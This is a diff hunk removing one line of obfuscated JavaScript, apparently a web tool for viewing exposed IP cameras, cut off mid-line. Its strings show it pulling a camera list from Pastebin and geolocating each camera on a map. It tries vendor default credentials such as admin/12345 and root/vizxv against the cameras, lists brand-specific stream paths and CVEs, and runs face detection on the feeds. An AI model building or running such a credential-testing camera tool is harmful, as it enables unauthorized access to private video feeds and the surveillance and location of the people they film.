@@ -1,1 +1,3866 @@
-const _0x5d7fa7=_0x30e5;function _0x30e5(_0x4a5a47,_0x13a4b1){const _0x8b5ff2=_0x8b5f();return _0x30e5=function(_0x30e59f,_0x185cd3){_0x30e59f=_0x30e59f-0x131;let _0x3f910f=_0x8b5ff2[_0x30e59f];return _0x3f910f;},_0x30e5(_0x4a5a47,_0x13a4b1);}(function(_0x293865,_0x2db6ea){const _0x22b378=_0x30e5,_0x3dcf53=_0x293865();while(!![]){try{const _0x5a590f=parseInt(_0x22b378(0x278))/0x1*(parseInt(_0x22b378(0x46e))/0x2)+-parseInt(_0x22b378(0x446))/0x3*(parseInt(_0x22b378(0x3c2))/0x4)+-parseInt(_0x22b378(0x335))/0x5+-parseInt(_0x22b378(0x2c8))/0x6*(parseInt(_0x22b378(0x2c0))/0x7)+parseInt(_0x22b378(0x19c))/0x8+-parseInt(_0x22b378(0x38c))/0x9+parseInt(_0x22b378(0x482))/0xa;if(_0x5a590f===_0x2db6ea)break;else _0x3dcf53['push'](_0x3dcf53['shift']());}catch(_0x1897a8){_0x3dcf53['push'](_0x3dcf53['shift']());}}}(_0x8b5f,0x84cc6));const API_ENDPOINTS={'IP_INFO':_0x5d7fa7(0x3f5),'IP_INFO_FIELDS':_0x5d7fa7(0x3c6),'PASTEBIN':'https://pastebin.com/raw/UuJZFNxF','CORS_PROXY':_0x5d7fa7(0x2d1),'ASN_INFO':_0x5d7fa7(0x183),'CAMERA_METADATA':_0x5d7fa7(0x2d1)};function _0x8b5f(){const _0x5323cc=['content','[extractCameraMetadata]\x20Window\x20ID\x20not\x20found','tplink','continent','h264Preview_01_main','nph-h264.cgi','Error\x20during\x20metadata\x20extraction:\x20','querySelector','none','camera-data-card','.raw-metadata-data','CVE-2020-5722:\x20Command\x20injection','contentRect','.toggle-credentials-btn','Y5eIMz3C','video0.sdp','.tab-content','elements','clientX','reolink','position','live_st1','parentNode','NVR\x20Service','<div\x20class=\x22loading\x22><i\x20class=\x22fas\x20fa-circle-notch\x20fa-spin\x22></i>\x20Loading\x20IP\x20information...</div>','1088ASdKFL','country','default','ch0_unicast_secondstream','status,message,continent,continentCode,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,offset,currency,isp,org,as,asname,reverse,mobile,proxy,hosting,query','1111111','pathname','<i\x20class=\x22fas\x20fa-chevron-up\x22></i>\x20Hide\x20Details','profile0','/manage/account/login','cam0','face-detection-box','change','var(--text-muted)','%20Street%2C%20','[generateAlternativeStreams]\x20Generating\x20RTSP\x20alternatives','cameraList','1234','filter','map','GRwvcj8j','faceapi','currentIpAsn','125','</span>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22detail-row\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span\x20class=\x22detail-label\x22>Region:</span>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span\x20class=\x22detail-value\x22>','detectAllFaces','add','Potentially\x20Unsafe','rtsp:','startsWith','parse','\x20default\x20credentials\x20and\x20','ch001.sdp','.test-progress','cameraModels','toISOString','Pastebin\x20request\x20timed\x20out','some','/cgi-bin/api.cgi','.firmware-version','autoResolutionGlobal','image.mpg','[extractCameraMetadata]\x20Error\x20extracting\x20metadata:','test-result-item\x20testing-animation','Pass','advancedMode','Generated\x20from\x20common\x20RTSP\x20paths','window-','camerasDataList','/cgi-bin/login.cgi','/cgi-bin/video.cgi','http://ip-api.com/json/','fontWeight','Setting\x20up\x20extract\x20metadata\x20button\x20click\x20handler\x20directly\x20in\x20openVideoWindow','Simple\x20user\x20account','<div\x20class=\x22spinner\x22></div><span>Loading\x20camera\x20list...</span>','<i\x20class=\x22fas\x20fa-copy\x22></i>\x20Username\x20copied\x20to\x20clipboard','\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<iframe\x20width=\x22100%\x22\x20height=\x22100%\x22\x20frameborder=\x220\x22\x20style=\x22border:0\x22\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20src=\x22https://maps.google.com/maps?width=100%&amp;height=600&amp;hl=en&amp;coord=','selected','admin1234','ipc-d','Multiple\x20unauthenticated\x20RCE\x20vulnerabilities','h264Preview_01_sub','log','<i\x20class=\x22fas\x20fa-times-circle\x22></i>\x20<strong>','livestream','GetData.cgi','Final\x20model\x20info:','ipcam','cam','toor','</span>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22detail-row\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span\x20class=\x22detail-label\x22>Mobile:</span>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span\x20class=\x22detail-value\x22>','live_mpeg4.sdp','borderLeftColor','\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span\x20class=\x22info-label\x22>Security:</span>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span\x20class=\x22info-value\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20','MediaInput/h264','max','prevWidth','Metadata\x20extraction\x20failed:\x20','object','/RPC2_Login','accc','videoWindowTemplate','offsetHeight','querySelectorAll','h264.sdp','ipInfo','mjpeg','</span>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20','[setupMetadataExtraction]\x20Calling\x20extractCameraMetadata','/mjpg/video.mjpg','round','innerWidth','mpeg4/1/media.amp','cam/realmonitor?channel=1&subtype=1','ds-','test','center','mjpeg/media.smp','\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22detail-row\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span\x20class=\x22detail-label\x22>City:</span>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span\x20class=\x22detail-value\x22>','services','webPaths','ch0_unicast_firststream','Recorder','</span>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22detail-row\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span\x20class=\x22detail-label\x22>Country:</span>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span\x20class=\x22detail-value\x22>','.mjpg','Brand\x20name\x20variation','&amp;q=1%20','Default\x20credentials\x20may\x20work','https://streamedian.com/embed?w=ZXVwLnN0cmVhbWVkaWFuLmNvbQ==&s=','Window\x20ID\x20not\x20found','[checkDefaultCredentials]\x20Normalized\x20manufacturer:\x20','</span>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22data-pair\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span\x20class=\x22data-label\x22>Location:</span>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span\x20class=\x22data-value\x22>','currentSelectedCamera','.vulnerability-count','[extractCameraMetadata]\x20Identifying\x20camera\x20model','play1.sdp','netcam','user=admin&password=&channel=1&stream=0.sdp?real_stream','[extractCameraMetadata]\x20Generated\x20','height','dragging','resizeObservers','img/video.sav','applyResolution','textContent','#camera-location','.credential-count','fixed','Common\x20default','Error\x20fetching\x20IP\x20info:','<i\x20class=\x22fas\x20fa-mobile-alt\x22></i>\x20Mobile','7044FkqjOY','apply','Factory\x20default','</span>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22detail-row\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span\x20class=\x22detail-label\x22>Resolution:</span>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span\x20class=\x22detail-value\x22>','Overlay\x20removed.','toUpperCase','box','Request\x20timed\x20out','vizxv','%2C%20','Backup\x20account\x20on\x20some\x20models','mousemove','</h4>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22camera-data-content\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20','ch2_0','root','signal','live.sdp','patterns','all','#ipInfoContainer','Updated\x20default\x20since\x202016','countryCode','\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22map-container\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<iframe\x20width=\x22100%\x22\x20height=\x22100%\x22\x20frameborder=\x220\x22\x20style=\x22border:0\x22\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20src=\x22https://maps.google.com/maps?width=100%&amp;height=600&amp;hl=en&amp;coord=','\x20security\x20(','clock','<span\x20class=\x22security-indicator\x20secure\x22><i\x20class=\x22fas\x20fa-check-circle\x22></i>\x20None\x20Found</span>','offsetLeft','Alternative\x20default','offsetTop','refreshCurrentIp','[extractCameraMetadata]\x20Generating\x20alternative\x20stream\x20URLs','CVE-2019-3948:\x20Unauthorized\x20access','unifi','6fJjMKYx','span','firmware','scrollIntoView','test-result-item\x20test-result-success','getElementsByClassName','catch','2YlrYkI','loadFromUri','850px','ASN\x20info:','\x20IP\x20Camera','error','10px','videostream.asf','ASN_INFO','</span>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22detail-row\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span\x20class=\x22detail-label\x22>Org:</span>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span\x20class=\x22detail-value\x22>','allowfullscreen','entries','marginBottom','Added\x200\x20points\x20for\x20medium\x20security\x20rating','clientY','ikwd','framerate','ip\x20camera','[setupMetadataExtraction]\x20Setting\x20up\x20metadata\x20extraction\x20for\x20window:','loading-message','19382700TvhUpm','Blank\x20password\x20on\x20some\x20models','vulnerabilities','.raw-asn-data','.manufacturer','Invalid\x20response\x20from\x20proxy\x20server','fliradmin','.test-results-content','hik-connect','Normal','POST','\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22detail-row\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span\x20class=\x22detail-label\x22>ASN:</span>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span\x20class=\x22detail-value\x22>','hikvision','Testing\x20credentials\x20(0/','prevHeight','av0_0','mpeg4unicast','Failed\x20to\x20load\x20camera\x20list:','Could\x20not\x20find\x20window\x20element\x20for\x20metadata\x20extraction','ONVIF/MediaInput?profile=4_def_profile6','onmousemove','Open\x20critical\x20port:\x20','hikconnect','Updated\x20default','slice','tp-link','h264_stream','main','removeEventListener','status','wbox','video0','application/json','live3.sdp','ipc-','timeout','iframe','top','stream1','streamUrl','[setupMetadataExtraction]\x20Extract\x20metadata\x20button\x20not\x20found\x20in\x20window','.stream-codec','rtsp_live0','/cgi/index.cgi','live/main','streaming/channels/0','Sidebar\x20or\x20titlebar\x20not\x20found','Stream\x20URL\x20not\x20found','innerHeight','zIndex','axis','vivotek','\x20potential\x20default\x20credentials','user_defined','text','rtsp','color','ch00/0','access_name_for_stream_1_to_5','Added\x202\x20points\x20for\x20high\x20security\x20rating','abort','Common\x20variation','[setupMetadataExtraction]\x20Error\x20during\x20metadata\x20extraction:','activeWindows','credential-action-btn','Weak\x20default\x20credentials','toString','Low','allowFullscreen','rtpvideo1.sdp','onvif-media/media.amp','protocol','codec','endsWith','prevZIndex','Identifying\x20camera\x20model\x20from\x20URL:','now.mp4','onmousedown','max-bundle','CVE-2021-36260:\x20Command\x20injection\x20via\x20web\x20interface','info','/webpages/index.html','mpeg4','/login','warn','/ISAPI/Security/userCheck','video1','currentIpLocation','get','Extract\x20metadata\x20button\x20clicked\x20directly','HTTPS','CVE-2020-9047:\x20Hard-coded\x20credentials','Guest\x20account','Empty\x20response\x20received','replaceWith','</div>','disabled','\x20generic\x20credentials\x20and\x20','streamedian','ch1_0','/api/v1/device',')</span>','left','currentIpNetwork','.test-credentials-btn','min','600px','query','.vulnerabilities-items','unload','stream/1','video.3gp','Testing\x20credentials\x20(','StdCh1','bitrate','rtsp_live1','visitor','currentIpMap','https://ipinfo.io/','stream.sdp','CH001.sdp','\x20points\x20for\x20known\x20vulnerabilities','json','554','closeVideoWindow','visible','AbortError','vvtk','ch01.264','dashboard-notification\x20notification-','tcp/av0_0','wyzecam','Final\x20security\x20score:','Yes','mpeg4/media.smp','scrollHeight','user','\x20alternative\x20stream\x20URLs','.window-title','tapo','No\x20default\x20credentials\x20found\x20for\x20this\x20camera\x20model.','DOMNodeRemoved','[extractCameraMetadata]\x20Extracted\x20IP\x20address:\x20','8530360AoEZFU','</span>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22info-row\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span\x20class=\x22info-label\x22>Country:</span>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span\x20class=\x22info-value\x22>','maximized','<i\x20class=\x22fas\x20fa-exclamation-triangle\x22></i>\x20Failed\x20to\x20load\x20camera\x20list','administrator','.stream-framerate','webrtc','mousedown','securityInfo','value','&amp;ie=UTF8&amp;t=&amp;z=14&amp;iwloc=B&amp;output=embed\x22\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20allowfullscreen>\x0a\x20\x20\x20\x20\x20\x20\x20\x20</iframe>\x0a\x20\x20\x20\x20','123456789','stringify','sidebar','Face\x20detection\x20error:','advancedDashboardTemplate','Unknown\x20URL','Error\x20fetching\x20Pastebin\x20content:','CVE-2013-6117:\x20Unauthenticated\x20access\x20to\x20device\x20configuration','observer','</span>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22info-section\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<h3><i\x20class=\x22fas\x20fa-server\x22></i>\x20Network</h3>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22info-row\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span\x20class=\x22info-label\x22>ISP:</span>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span\x20class=\x22info-value\x22>','aircam','Lack\x20of\x20HTTPS\x20encryption','Click\x20to\x20copy\x20password','org','<i\x20class=\x22fas\x20fa-check-circle\x22></i>\x20Credential\x20testing\x20complete','includes','CVE-2018-19355:\x20Authentication\x20bypass','frameBorder','Error\x20initializing\x20face\x20detection:','Metadata\x20extraction\x20result:','Element\x20with\x20id\x20\x27','.auth-status','<span\x20class=\x22security-indicator\x20danger\x22><i\x20class=\x22fas\x20fa-exclamation-triangle\x22></i>\x20Not\x20Required</span>','Starting\x20with\x20base\x20score:','addIpButton','.camera-model','/videostream.cgi','currentIpAddress','proxy','<i\x20class=\x22fas\x20fa-chevron-down\x22></i>\x20Show\x20Details','Telnet/SSH\x20access\x20on\x20older\x20models','streamInfo','tlJwpbo6','.vulnerabilities-list','</span>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22info-row\x20','[extractCameraMetadata]\x20Security\x20rating:\x20','ch1-s1','666','666666','.credentials-list','profile5/media.smp','[extractCameraMetadata]\x20Stream\x20URL:\x20','timezone','Camera\x20hosted\x20in\x20data\x20center','tabcontent','dataset','rtsp_live2','type','CVE-2018-10660:\x20Command\x20injection\x20in\x20older\x20firmware','0/usrnm:pwd/main','Generic\x20IP\x20Camera','charAt','aiphone','live','cam/realmonitor?channel=0&subtype=0','.maximize','div','.dashboard-section','Common\x20for\x20embedded\x20systems','tmpfs/auto.jpg','webcam','bold','submit','Error\x20updating\x20camera\x20list:','Metadata\x20extraction\x20completed\x20successfully','getElementById','rating','api/mjpegvideo.cgi','hostname','High','.stream-resolution','<p>No\x20location\x20data\x20available</p>','<i\x20class=\x22fas\x20fa-shield-alt\x22></i>\x20Proxy','VideoInput/1/h264/1','tablinks','rating-value\x20','<i\x20class=\x22fas\x20fa-unlock\x22></i>\x20Credential\x20test\x20successful!','Reolink123','kj3TqCWv','notes','[checkDefaultCredentials]\x20Found\x20','DOMContentLoaded','video.mp4','[extractCameraMetadata]\x20Window\x20element:','[setupMetadataExtraction]\x20Window\x20element\x20is\x20null\x20or\x20undefined','Newer\x20models\x20default','asnInfo','removeChild','udp/unicast/aiphone_H264','Analyzing\x20security\x20rating','MJPG','AVStream1_1','Generated\x20from\x20database','443','/live','Auth\x20info:','user=admin&password=&channel=1&stream=0.sdp?','\x20security','message','udpstream','low','disconnect','</span>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22detail-row\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span\x20class=\x22detail-label\x22>Timezone:</span>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span\x20class=\x22detail-value\x22>','Outdated\x20firmware','nets','[setupMetadataExtraction]\x20Metadata\x20extraction\x20result:','\x20(Score:\x20','profile2','advancedDashboard','Administrator','<i\x20class=\x22fas\x20fa-video\x22></i>\x20','.window[data-id=\x22','console-line','highlight-window','width','\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20','</span>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20','createElement','Invalid\x20response\x20format\x20from\x20proxy\x20server','<i\x20class=\x22fas\x20fa-copy\x22></i>\x20Credential\x20copied\x20to\x20clipboard','Port\x20info:','tab','\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22detail-row\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span\x20class=\x22detail-label\x22>ISP:</span>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span\x20class=\x22detail-value\x22>','forEach','meinsm','supervisor','/login.html','ubnt','.minimize','CORS_PROXY','</span>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22detail-row\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span\x20class=\x22detail-label\x22>Hostname:</span>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span\x20class=\x22detail-value\x22>','[extractCameraMetadata]\x20Window\x20ID\x20from\x20dataset:','http://','toFixed','\x27\x20not\x20found','active','admin1','credential-copy','.tab-button','opacity','/models','unified-plan','profile2/media.smp','security-alert','trim','.player-select','button','prevTop','media/media.amp','split','ivms','</span>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22detail-row\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span\x20class=\x22detail-label\x22>Company:</span>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span\x20class=\x22detail-value\x22>','faceDetectionToggle','foscam','ch0','Subtracted\x20','checked','asname','playerPreference','Checking\x20organization\x20info:','isp','avn=2','medias2','<option\x20value=\x22\x22>Select\x20a\x20camera...</option>','score','[extractCameraMetadata]\x20Metadata\x20extraction\x20completed\x20successfully','/cgi-bin/configManager.cgi','Vulnerabilities\x20found:','MediaInput/mpeg4','replace','udp/av0_0','display','axis-media/media.amp',',\x20Message:\x20','123','</span>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22detail-row\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span\x20class=\x22detail-label\x22>Hosting:</span>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span\x20class=\x22detail-value\x22>','faceRecognitionNet','CVE-2021-41653:\x20Information\x20disclosure','className','Most\x20common\x20default','name','console-message','/cgi-bin/admin/getparam.cgi','live/av0','h264_vga.sdp','vis','toLowerCase','streaming/channels/1','HuaWei123','\x20active','test-result-item\x20test-result-failure','2\x20Mbps\x20(estimated)','IP\x20info:','(blank)','No\x20known\x20vulnerabilities\x20found\x20for\x20this\x20camera\x20model.','videoMain','contains','advancedModeButton','channel1','ch4_0','cam1/mpeg4?user=\x27username\x27&pwd=\x27password\x27','style','</span>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22data-pair\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span\x20class=\x22data-label\x22>ASN:</span>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span\x20class=\x22data-value\x22>','classList','/json','/view/index.shtml','720x420','WebRTC,MSE','lon','115161QkEJek','.nav-item','Error\x20fetching\x20JSON:','port','Unknown\x20Service','#current-ip','ipcam_mjpeg.sdp','body','.toggle-vulnerabilities-btn','/RPC2','overlay','Secondary\x20account','[checkDefaultCredentials]\x20Found\x20manufacturer\x20in\x20database:\x20','addIpForm','#api-endpoints','IP_INFO','cam1/mjpeg','fa-compress','img/media.sav?channel=1','lat','[openVideoWindow]\x20Created\x20window\x20element\x20with\x20dataset:','Fetching\x20IP\x20info\x20using\x20proxy\x20from:\x20','cam1/h264/multicast','addEventListener','from','<i\x20class=\x22fas\x20fa-spinner\x20fa-spin\x22></i>\x20Testing\x20','ioImage/1','0/video1','remove','<i\x20class=\x22fas\x20fa-eye\x22></i>\x20Viewing\x20camera\x20window','111111','</span>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22detail-row\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span\x20class=\x22detail-label\x22>ASN\x20Name:</span>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span\x20class=\x22detail-value\x22>','<i\x20class=\x22fas\x20fa-exclamation-triangle\x22></i>\x20Camera\x20window\x20not\x20found','securityRating','Test\x20this\x20credential','[extractCameraMetadata]\x20Window\x20dataset:','cam0_1','media','</span>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22detail-row\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span\x20class=\x22detail-label\x22>Continent:</span>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span\x20class=\x22detail-value\x22>','video.h264','amcrest','admin\x20pass','0/1:1/main','\x27\x20not\x20found\x20in\x20DOM\x20cache','video.mjpg','currentIpLocationDetails','nphMpeg4/g726-640x','[checkDefaultCredentials]\x20Manufacturer\x20not\x20found\x20in\x20database,\x20using\x20generic\x20credentials','CVE-2018-13878:\x20Authentication\x20bypass','Original\x20stream\x20URL','Root','Invalid\x20URL\x20format.\x20Please\x20use\x20a\x20valid\x20RTSP\x20or\x20HTTP\x20stream\x20URL.','Dinion','password','[extractCameraMetadata]\x20Path:\x20','innerHTML','cam0_0','manualResolutionControls','.window-titlebar','mobile','cameras','Simple\x20numeric\x20password','888888','axis2022','metadata','live/main0','target','nphMpeg4/g726-640x48','Admin12345','click','img/media.sav','hosting','4893AkHIAp','View-only\x20account','Model\x20info:','.window','h264/ch1/sub/av_stream','currentIpSelector','toggle','ubiquiti','5214REwbXr','district','live/mpeg4','camera-list-item','guest','<i\x20class=\x22fas\x20fa-copy\x22></i>\x20Password\x20copied\x20to\x20clipboard','pass','.close','Medium','https://serverless-api-jnzf.vercel.app/api/proxy','HighResolutionVideo','live1.sdp','Unknown\x20error','closest','video.pro1','.extract-metadata-btn','25\x20fps\x20(estimated)','option','admin','manualResolution','regionName','/video.cgi','720p','<i\x20class=\x22fas\x20fa-vial\x22></i>','HTTP\x20error!\x20Status:\x20','mouseup','cloneNode','media.amp','Error\x20during\x20metadata\x20extraction:','Extracted\x20model\x20number:\x20','/cgi-bin/viewer/video.jpg','wss://demo.flashphoner.com:8443','fa-expand','12345678910','wyze','live/ch00_0','</span>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22ip-address\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<i\x20class=\x22fas\x20fa-network-wired\x22></i>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span>','multicaststream','/cgi-bin/ptz.cgi','.stream-bitrate','uvc','stopPropagation','city','[extractCameraMetadata]\x20Open\x20ports:\x20','colSpan','addIpInput','CVE-2017-8229:\x20Authentication\x20bypass','ch3/0','stream','Testing\x20complete\x20(','event','wfov','12345','execCommand','[extractCameraMetadata]\x20Found\x20','/axis-cgi/admin/param.cgi','H.264','appendChild','cameraDetails','flashphoner','Fetching\x20JSON\x20from:\x20','.video-title','consoleLog','.nav-item[data-section=\x22current-ip\x22]','onmouseup','src','camera.stm','...','.progress-text','borderRadius','h264','cam1/mpeg4','streaming/channels/101','4321','admin123456','[setupMetadataExtraction]\x20Event\x20listener\x20added\x20to\x20extract\x20metadata\x20button','\x20items)]','admin123','fp_embed_player','show','rtspPaths','.metadata-loading','<i\x20class=\x22fas\x20fa-check-circle\x22></i>\x20<strong>','ch4/0','12345678','service','flex','viewer','480p','scrolling','cam1/onvif-h264','PASTEBIN','tinyFaceDetector','video.cgi','length','Unknown\x20IP','ONVIF/MediaInput','Admin','Window\x20element\x20not\x20found','<span\x20class=\x22security-indicator\x20warning\x22><i\x20class=\x22fas\x20fa-exclamation-circle\x22></i>\x20Possible\x20(',':80','getComputedStyle','marginHeight','Found\x20matching\x20pattern\x20\x22','.video-container','currentTarget','block','rawData','/cgi-bin/snapshot.cgi','3258325xxbgga','/cgi-bin/CGIProxy.fcgi','Brand\x20name\x20as\x20password','axis-media/media.amp?camera=1','[setupMetadataExtraction]\x20Extract\x20button\x2